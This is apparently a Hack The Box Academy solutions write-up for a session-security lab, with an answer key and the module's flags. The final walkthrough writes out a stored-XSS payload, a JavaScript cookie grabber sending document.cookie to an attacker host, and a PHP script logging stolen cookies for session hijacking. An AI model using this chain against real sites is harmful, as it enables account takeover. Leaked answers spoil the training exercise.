
| Section | Question Number | Answer |
| --- | --- | --- |
| Session Hijacking | Question 1 | cookie |
| Session Fixation | Question 1 | Yes |
| Obtaining Session Identifiers without User Interaction | Question 1 | Yes |
| Cross-Site Scripting (XSS) | Question 1 | Yes |
| Cross-Site Request Forgery | Question 1 | Yes |
| Cross-Site Request Forgery (GET-based) | Question 1 | Yes |
| Cross-Site Request Forgery (POST-based) | Question 1 | Yes |
| XSS & CSRF Chaining | Question 1 | Yes |
| Exploiting Weak CSRF Tokens | Question 1 | Popup Blockers |
| Open Redirect | Question 1 | Yes |
| Session Security - Skills Assessment | Question 1 | \[YOU\_ARE\_A\_SESSION\_WARRIOR\] |
| Session Security - Skills Assessment | Question 2 | FLAG{SUCCESS\_YOU\_PWN3D\_US\_H0PE\_YOU\_ENJ0YED} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Session Hijacking

## Question 1

### "What kind of session identifier does the application employ? Answer options (without quotation marks): "URL parameter", "URL argument", "body argument", "cookie" or "proprietary solution""

Through using Burp or the Developer tools, students will notice that there is no other session-handling mechanism other than a `cookie` (named auth-session).

Answer: `cookie`

# Session Fixation

## Question 1

### "If the HttpOnly flag was set, would the application still be vulnerable to session fixation? Answer Format: Yes or No"

`Yes`; `HttpOnly` is an anti-XSS mechanism. If a session fixation vulnerability exists, `HttpOnly` can do nothing to prevent it from happening.

Answer: `Yes`

# Obtaining Session Identifiers without User Interaction

## Question 1

### "If xss.htb.net was an intranet application, would an attacker still be able to capture cookies via sniffing traffic if he/she got access to the company's VPN? Suppose that any user connected to the VPN can interact with xss.htb.net. Answer format: Yes or No"

`Yes`; an attacker with access to a company's VPN essentially resides in the company's internal network. This means that the attack can sniff/monitor internal network traffic and capture any passing cookies on the wire (as long as the traffic is not encrypted).

Answer: `Yes`

# Cross-Site Scripting (XSS)

## Question 1

### "If xss.htb.net was utilizing SSL encryption, would an attacker still be able to capture cookies through XSS? Answer format: Yes or No"

`Yes`; SSL protects the data being transmitted from eavesdropping. If a web asset is vulnerable to XSS, JavaScript code is used to exfiltrate cookies through a request. SSL encryption can do nothing to stop/prevent this request from happening.

Answer: `Yes`

# Cross-Site Request Forgery (CSRF or XSRF)

## Question 1

### "If the update-profile request was GET-based and no anti-CSRF protections existed, would you still be able to update Ela Stienen's profile through CSRF? Answer format: Yes or No"

`Yes`; Both `GET-based` and `POST-based` requests can be vulnerable to CSRF. The only difference will be in the structure of the malicious request.

Answer: `Yes`

# Cross-Site Request Forgery (GET-based)

## Question 1

### "If csrf.htb.net was utilizing SSL encryption, would an attacker still be able to alter Julie Rogers' profile through CSRF? Answer format: Yes or No"

`Yes`; SSL protects the data being transmitted from eavesdropping. If a web asset is vulnerable to CSRF, inadvertent actions are performed through malicious requests (that inherit the victim's permissions/privileges). SSL encryption can do nothing to stop/prevent such requests from happening.

Answer: `Yes`

# Cross-Site Request Forgery (POST-based)

## Question 1

### "If csrf.htb.net was utilizing secure cookies, would an attacker still be able to leak Julie Roger's CSRF token? Answer format: Yes or No"

`Yes`; the purpose of the secure attribute is to prevent cookies from being observed by unauthorized parties due to the transmission of the cookie in cleartext. To accomplish this goal, browsers that support the secure attribute will only send cookies with the secure attribute when the request is going to an HTTPS page. In this case, a CSRF token is leaked through HTML Injection. The secure attribute cannot prevent the above mentioned leakage as it is a cookie-specific protection.

Answer: `Yes`

# XSS & CSRF Chaining

## Question 1

### "Same Origin Policy cannot prevent an attacker from changing the visibility of @goldenpeacock467's profile. Answer Format: Yes or No"

`Yes`; during CSRF attacks, the attacker does not need to read the server's response to the malicious cross-site request. This means that Same-Origin Policy cannot be considered a security mechanism against CSRF attacks.

Answer: `Yes`

# Exploiting Weak CSRF Tokens

## Question 1

### "Our malicious page included a user-triggered event handler (onclick). To evade what kind of security measure did we do that? Answer options (without quotation marks): "Same-Origin Policy", "Popup Blockers", "XSS Filters""

`Popup Blockers` in modern browsers prevent inadvertent/malicious requests from happening automatically. If a user triggers the request (that is hosted on a malicious page) through some kind of interaction, it will be issued successfully.

Answer: `Popup Blockers`

# Open Redirect

## Question 1

### "If the request to complete.html was GET-based, would you still be able to obtain the token via exploiting the open redirect vulnerability? Answer format: Yes or No"

`Yes`; the token would just be included in the URL if the request was GET-based.

Answer: `Yes`

# Session Security - Skills Assessment

## Question 1

### "Read the flag residing in the admin's public profile. Answer format: \[string\]"

After spawning the target machine, students need to add the vHost `minilab.htb.net` into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP minilab.htb.net" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-ngtblxja5i]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.42.195 minilab.htb.net" >> /etc/hosts'
```

Subsequently, students need to navigate to `http://minilab.htb.net/submit-solution` to find that the URL-parameter `?url` is required:

![[HTB Solutions/CBBH/z. images/0f80f71a96beaf484dbb7b26df475dc3_MD5.jpg]]

Using the credentials `heavycat106:rocknrol` that are provided in the section, students need to navigate to `http://minilab.htb.net/` and sign in:

![[HTB Solutions/CBBH/z. images/b45f57eb5738321b2c1731a4e3a40ff2_MD5.jpg]]

Subsequently, students need to test all the field for XSS; to do so, students first need to start an `nc` listener:

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-ngtblxja5i]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Then, students need to fill the `Telephone` and `Country` fields with a XSS payload that will request a file, as in `<script src=http://PWNIP:PWNPO/TelephoneField></script>`:

![[HTB Solutions/CBBH/z. images/652130b33e072f55af2c9e2431678d2b_MD5.jpg]]

![[HTB Solutions/CBBH/z. images/04222f18b8288a435386bbcdbadfec2e_MD5.jpg]]

After saving and clicking on `Share`, students will notice that there is a `GET` request to `/CountryField`, therefore, it is vulnerable to a stored XSS:

![[HTB Solutions/CBBH/z. images/8a5498ca1a45241361195c521f96c5dc_MD5.jpg]]

```
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-ngtblxja5i]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.14.41.
Ncat: Connection from 10.10.14.41:46502.
GET /CountryField HTTP/1.1
Host: 10.10.14.41:9001
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Referer: http://minilab.htb.net/
Sec-GPC: 1
```

Thus, students need to copy the URL to Julie's profile, which is `http://minilab.htb.net/profile?email=julie.rogers@example.com`, and instead of sending a get request to the local machine, they need to steal the admin's cookie. First, students need to write a JS cookie grabber to a local file (named `script.js`) so that it get requested for:

Code: js

```js
new Image().src='http://PWNIP:PWNPO/index.php?c=' + document.cookie;
```

Students can use `cat` to save the cookie grabber into a file:

Code: shell

```shell
cat << 'EOF' > script.js
new Image().src='http://10.10.14.41:9001/index.php?c=' + document.cookie;
EOF
```

```
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-nvwebl9plw]─[~]
└──╼ [★]$ cat << 'EOF' > script.js
> new Image().src='http://10.10.14.41:9001/index.php?c=' + document.cookie;
> EOF
```

Subsequently, students need to write a PHP script (named `index.php`) that will split cookies in case many were received (and writes them to a file):

Code: php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Then, students need to start an HTTP server with PHP in the same directory where `script.js` and `index.php` are:

Code: shell

```shell
php -S 0.0.0.0:PWNPO
```

```
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-nvwebl9plw]─[~]
└──╼ [★]$ php -S 0.0.0.0:9001

[Tue Nov 29 04:14:23 2022] PHP 7.4.30 Development Server (http://0.0.0.0:9001) started
```

Then, students need to inject the "Telephone" field with a XSS such as `<script src=http://STMIP:STMPO/script.js></script>` payload so that the admin user will request `script.js` and get their cookie stolen:

![[HTB Solutions/CBBH/z. images/7867eb53582c33f436d253a0c3930b0b_MD5.jpg]]

![[HTB Solutions/CBBH/z. images/078a8cc9e6730797191a8eefd9a8655e_MD5.jpg]]

Students can test if the payload is working by visiting `Share` and noticing that the cookie of Julie's session is sent to the HTTP server:

```
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-ngtblxja5i]─[~]
└──╼ [★]$ php -S 0.0.0.0:9001

[Tue Nov 29 09:02:21 2022] PHP 7.4.30 Development Server (http://0.0.0.0:9001) started
[Tue Nov 29 09:09:01 2022] 10.10.14.41:40180 Accepted
[Tue Nov 29 09:09:01 2022] 10.10.14.41:40180 [200]: GET /index.php?c=auth-session=s%3A4UCuTyC6ujeLyv8pxkgglm1fQ-Rca6sW.zHDrJjfaSn5o%2F5TfIDQ%2B2LjExLqm9dS6cr5vIzAsToA
[Tue Nov 29 09:09:01 2022] 10.10.14.41:40180 Closing
```

Subsequently, using Julie's share link, `http://minilab.htb.net/profile?email=julie.rogers@example.com`, students need to navigate to `http://minilab.htb.net/submit-solution` and provide the share link as the value for the URL parameter `url`, as in `http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com`:

![[HTB Solutions/CBBH/z. images/a966a5debf019391da38d7421a9b603b_MD5.jpg]]

Checking the HTTP server, students will know that the cookie of the admin is `s%3Ag_qnykCyzo6h5-uViQJW1cTIN4sFUSAR.Ir%2BO%2FcnPTN7Q%2Fp%2FKeuQ%2FzNMdwFeHWVUsnV7HNJ5HflQ`:

```
[Tue Nov 29 09:12:56 2022] 10.129.44.2:51070 Accepted
[Tue Nov 29 09:12:56 2022] 10.129.44.2:51070 [200]: GET /index.php?c=auth-session=s%3Ag_qnykCyzo6h5-uViQJW1cTIN4sFUSAR.Ir%2BO%2FcnPTN7Q%2Fp%2FKeuQ%2FzNMdwFeHWVUsnV7HNJ5HflQ
[Tue Nov 29 09:12:56 2022] 10.129.44.2:51070 Closing
```

Therefore, students need to replace the value of the `auth-session` cookie of Julie with that of the admin, `s%3Ag_qnykCyzo6h5-uViQJW1cTIN4sFUSAR.Ir%2BO%2FcnPTN7Q%2Fp%2FKeuQ%2FzNMdwFeHWVUsnV7HNJ5HflQ`:

![[HTB Solutions/CBBH/z. images/81a2cb06c7686efa4468f60daf529751_MD5.jpg]]

After refreshing the page, students will notice that the user has changed to Super Admin, thus, they need to click on `Change Visibility` and make the profile public:

![[HTB Solutions/CBBH/z. images/e6a93ec5aaad723c782a5631054aac85_MD5.jpg]]

![[HTB Solutions/CBBH/z. images/99bb6f1767fbcde95ca5515b5e856f3f_MD5.jpg]]

Afterward, students need to click on `Share`, to find the flag `[YOU_ARE_A_SESSION_WARRIOR]`:

![[HTB Solutions/CBBH/z. images/3de395f1d7e985c1eddd4e2e8ea8fc32_MD5.jpg]]

Answer: `[YOU_ARE_A_SESSION_WARRIOR]`

# Session Security - Skills Assessment

## Question 2

### "Go through the PCAP file residing in the admin's public profile and identify the flag. Answer format: FLAG{string}"

From the previous question, students have logged in as Super Admin, thus, within the `Share` page, students need to click on "Flag2" to download the `PCAP` file "download-pcap":

![[HTB Solutions/CBBH/z. images/507bbdf72f204f3c1ba5e2d7dcf5292c_MD5.jpg]]

After downloading it, students need to open it with `Wireshark`, and filter for HTTP traffic only with the filter `http`, finding the flag `FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED}` within packet number 5440:

Code: shell

```shell
wireshark download-pcap
```

```
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-ngtblxja5i]─[~]
└──╼ [★]$ wireshark download-pcap

09:47:58.553     Main Warn QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-htb-ac413848'
```

![[HTB Solutions/CBBH/z. images/fca480a78982c9b34afcb7ab57e26efe_MD5.jpg]]

Answer: `FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED}`